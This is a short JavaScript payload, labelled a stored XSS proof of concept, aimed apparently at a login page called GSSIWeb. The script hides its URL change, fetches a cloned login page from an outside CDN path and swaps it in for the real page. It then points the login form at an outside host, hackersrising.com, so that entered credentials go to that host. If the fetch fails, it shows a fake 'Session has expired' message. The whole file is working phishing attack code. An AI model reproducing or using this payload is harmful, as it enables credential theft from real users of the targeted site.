// fakelogin.js - Full page replacement for stored XSS PoC

(function() {
    'use strict';

    // Make the URL in the address bar look legitimate
    history.replaceState(null, document.title, location.pathname);

    // Load and inject your full cloned login page
    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
        .then(response => {
            if (!response.ok) throw new Error('Failed to fetch');
            return response.text();
        })
        .then(html => {
            // This replaces the ENTIRE page with your cloned login.html
            document.documentElement.innerHTML = html;

            // Optional: Small delay to ensure DOM is ready
            setTimeout(() => {
                const form = document.getElementById('DietaryLogin');
                if (form) {
                    // Double-check the action points to your server
                    form.action = 'https://hackersrising.com/GPAPI/oauth/login';
                    console.log('%c[PoC] Fake GSSIWeb login page loaded successfully', 'color: red; font-size: 16px;');
                }
            }, 400);
        })
        .catch(err => {
            console.error('PoC error:', err);
            // Fallback message (looks more professional)
            document.documentElement.innerHTML = `
                <!DOCTYPE html>
                <html>
                <head><title>GSSIWeb - Login</title></head>
                <body style="font-family:Arial;text-align:center;margin-top:150px;color:#333;">
                    <h2>Session has expired</h2>
                    <p>Please log in again to continue.</p>
                </body>
                </html>`;
        });
})();
